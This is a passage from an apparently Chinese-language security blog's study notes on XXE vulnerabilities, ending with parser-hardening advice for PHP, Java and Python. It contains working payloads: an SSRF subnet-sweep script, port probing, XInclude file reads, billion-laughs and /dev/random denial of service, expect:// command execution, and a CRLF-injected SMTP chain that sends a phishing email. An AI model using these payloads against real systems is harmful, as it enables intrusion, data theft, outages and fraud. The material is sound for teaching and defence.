class="keyword">def</span> <span class="title">send_xml</span>(<span class="params">xml</span>):</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/xml&#x27;</span>&#125;</span><br><span class="line">    x = requests.post(<span class="string">&#x27;http://192.168.118.144/xxe.php&#x27;</span>, data=xml, headers=headers, timeout=<span class="number">5</span>).text</span><br><span class="line">    <span class="keyword">print</span> x</span><br><span class="line">    <span class="comment"># print base64.b64decode(x)</span></span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        ip_arr.append(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = str(i)</span><br><span class="line">        ip = <span class="string">&#x27;192.168.118.&#x27;</span> + i</span><br><span class="line">        string = <span class="string">&#x27;php://filter/convert.base64-encode/resource=http://&#x27;</span> + ip + <span class="string">&#x27;/&#x27;</span></span><br><span class="line">        <span class="keyword">print</span> string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/2019-02-17_00001.png"></p>
<h2 id="4-http内网主机端口探测"><a href="#4-http内网主机端口探测" class="headerlink" title="4. http内网主机端口探测"></a>4. http内网主机端口探测</h2><p>关于端口探测，和主机探测是类似的意思，在确定主机IP后，固定IP，利用payload，循环修改端口，查看结果即可。通常情况下，可以根据响应时间/长度/响应数据，攻击者将可以判断该端口是否已被开启。</p>
<p>比如说，我们确定了一台主机，利用下面的payload，在测试环境下会报错，而且端口开放与未开放的报错不一样，于是可以进行区分(80为开放端口，2333为未开放端口)：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">data</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;https://127.0.0.1:83/&quot;</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">data</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>4<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/2019-02-17_00003.png"></p>
<p><img src="https://i.loli.net/2019/02/18/5c69991fbd04e.png"></p>
<p>可以利用<code>burpsuite</code>或者写脚本，都可以很轻松的进行端口扫描，但是若想全部扫描，这个过程会比较耗时，也可以构建常用端口字典，进行部分扫描，提高效率。</p>
<p><img src="https://i.loli.net/2019/02/17/5c695e0ec66f7.png"></p>
<p><img src="https://i.loli.net/2019/02/17/5c695ecb3514c.png"></p>
<p><em>笔者测试发现不同的环境，结果可能会不一样，因此可能需要不同的payload进行端口扫描，这个需要具体结合代码和测试结果来敲定一个有效的payload。</em></p>
<h2 id="5-XInclude"><a href="#5-XInclude" class="headerlink" title="5. XInclude"></a>5. XInclude</h2><p>这个和<code>SchemaEntity</code>有关，可以看成是XML的扩展和继承，想了解更多可能要参考这个： <a target="_blank" rel="noopener" href="http://www.w3school.com.cn/schema/schema_intro.asp">http://www.w3school.com.cn/schema/schema_intro.asp</a></p>
<p><strong>XML Schema：</strong>称为可扩展标记语言架构，用来定义 XML 文档的合法构建模块，类似 DTD，Schema是DTD的替代者, 它比DTD可以做更多的事情 。</p>
<p>include的href属性中可以进行文件读取，也可以使用协议进行SSRF。不过Xinclude需要手动开启，测试发现所有xml parser都默认关闭这一特性。</p>
<p><strong>示例代码</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;file:///home/rq/f123333333ag&quot;</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">xi:include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="6-其他攻击"><a href="#6-其他攻击" class="headerlink" title="6. 其他攻击"></a>6. 其他攻击</h2><h3 id="6-1-DDoS"><a href="#6-1-DDoS" class="headerlink" title="6.1 DDoS"></a>6.1 DDoS</h3><p><strong>示例代码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">  &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</span><br></pre></td></tr></table></figure>

<p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。<br>亦或者，如果目标是UNIX系统，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;dev&#x2F;random&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure>

<p>如果 XML 解析器尝试使用 /dev/random 文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p>
<h3 id="6-2-php-except模块下RCE"><a href="#6-2-php-except模块下RCE" class="headerlink" title="6.2 php except模块下RCE"></a>6.2 php except模块下RCE</h3><p>这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当/开发内部应用导致的。如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE。</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect:&#x2F;&#x2F;id&quot;&gt;]&gt;</span><br><span class="line">&lt;dir&gt;</span><br><span class="line">&lt;file&gt;&amp;cmd;&lt;&#x2F;file&gt;</span><br><span class="line">&lt;&#x2F;dir&gt;</span><br></pre></td></tr></table></figure>



<h3 id="6-3-钓鱼"><a href="#6-3-钓鱼" class="headerlink" title="6.3 钓鱼"></a>6.3 钓鱼</h3><p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用 ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼。以下内容摘自<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/177979.html">https://www.freebuf.com/articles/web/177979.html</a></p>
<p>我们使用Java的XML解析器找到了一个易受攻击的端点。扫描内部端口后，我们发现了一个侦听在25端口的SMTP服务，Java支持在<code>sun.net.ftp.impl.FtpClient</code>中的ftp URI。因此，我们可以指定用户名和密码，例如<code>ftp://user:password@host:port/test.txt</code>，FTP客户端将在连接中发送相应的USER命令。</p>
<p>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ftp:<span class="comment">//a%0D%0A</span></span><br><span class="line">EHLO%<span class="number">20</span>a%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">MAIL%<span class="number">20</span>FROM%<span class="number">3</span>A%<span class="number">3</span>Csupport%<span class="number">40</span>VULNERABLESYSTEM.com%<span class="number">3</span>E%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">RCPT%<span class="number">20</span>TO%<span class="number">3</span>A%<span class="number">3</span>Cvictim%<span class="number">40</span>gmail.com%<span class="number">3</span>E%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">DATA%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">From%<span class="number">3</span>A%<span class="number">20</span>support%<span class="number">40</span>VULNERABLESYSTEM.com%<span class="number">0</span>A</span><br><span class="line">To%<span class="number">3</span>A%<span class="number">20</span>victim%<span class="number">40</span>gmail.com%<span class="number">0</span>A</span><br><span class="line">Subject%<span class="number">3</span>A%<span class="number">20</span>test%<span class="number">0</span>A</span><br><span class="line">%<span class="number">0</span>A</span><br><span class="line">test!%<span class="number">0</span>A</span><br><span class="line">%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">.%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">QUIT%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">:a@VULNERABLESYSTEM.com:<span class="number">25</span></span><br></pre></td></tr></table></figure>

<p>当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ftp:<span class="comment">//a</span></span><br><span class="line">EHLO a</span><br><span class="line">MAIL FROM: <span class="xml"><span class="tag">&lt;<span class="name">support@VULNERABLESYSTEM.com</span>&gt;</span></span></span><br><span class="line">RCPT TO: &lt;victim@gmail.com&gt;</span><br><span class="line">DATA</span><br><span class="line">From: support@VULNERABLESYSTEM.com</span><br><span class="line">To: victim@gmail.com</span><br><span class="line">Subject: Reset your password</span><br><span class="line">We need to confirm your identity. Confirm your password here: http://PHISHING_URL.com</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line">:support@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></table></figure>

<p>这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。</p>
<h1 id="XXE的防护"><a href="#XXE的防护" class="headerlink" title="XXE的防护"></a>XXE的防护</h1><p>在介绍成因的时候说过，<strong>会发生XXE 主要是因为<code>parser</code> 没有禁止使用外部实体</strong>，所以防护方法就是<strong>使用语言中推荐的禁用外部实体的方法</strong>。</p>
<p><strong>PHP：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>

<p><strong>Java:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http:&#x2F;&#x2F;apache.org&#x2F;xml&#x2F;features&#x2F;disallow-doctype-decl&quot;,true);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http:&#x2F;&#x2F;xml.org&#x2F;sax&#x2F;features&#x2F;external-general-entities&quot;,false)</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http:&#x2F;&#x2F;xml.org&#x2F;sax&#x2F;features&#x2F;external-parameter-entities&quot;,false);</span><br></pre></td></tr></table></figure>

<p><strong>Python：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</span><br></pre></td></tr></table></figure>



<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>XXE作为2017最新发布的<code>OWASP TOP10</code>的漏洞，其广泛性和危害性不言而喻。其攻击手段也是多种多样，在和其他漏洞结合之后，可以产生惊人的效果。笔者对XXE做了很多的复现和研究，得到的一些感悟和收获。之后可能还会对扩展性的xml_Schema以及与其他漏洞的结合做进一步的深入学习研究。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">K0rz3n——一篇文章带你深入理解漏洞之 XXE 漏洞</a></li>
<li><a target="_blank" rel="noopener" href="http://www.w3school.com.cn/x.asp">W3School的XML系列教程</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/likwo/archive/2011/08/24/2151793.html">XML文档解析的几种方式</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/156863.html">freebuf——XXE学习之路-STEP BY STEP</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/177979.htm">freebuf——XXE漏洞利用技巧：从XML到远程代码执行</a></li>
<li>[DTD/XXE 攻击笔记分享](DTD/XXE 攻击笔记分享)</li>
<li><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html">你所不知道的XML安全</a></li>
</ol>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:v0wldl@163.com">V0WKeep3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://v0w.top/2019/01/20/XXE-note/">http://v0w.top/2019/01/20/XXE-note/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://v0w.top">V0W's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/XXE/">XXE</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="http://image.v0w.top/Blog/2020-08-28-044057.png"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="http://image.v0w.top/Blog/2020-08-28-044040.png"><div class="post-qr-code__desc">微信打赏</div></div></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/02/01/Hgame2019-week1WP/"><i class="fa fa-chevron-left">  </i><span>杭电Hgame2019-week1-WP</span></a></div><div class="next-post pull-right"><a href="/2019/01/16/CodeBreak/"><span>知识星球-代码审计Codebreak部分WP</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'xuqLRcah5FaInOgKRdj9JB3V-gzGzoHsz',
  appKey:'8vMPXnFoh7Fih1g29jw4JNxl',
  placeholder:'师傅可以留下你的评论和邮箱，V0W能够通过邮件get并回复哦～',
  avatar:'retro',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(/img/index.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2020 By V0WKeep3r</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>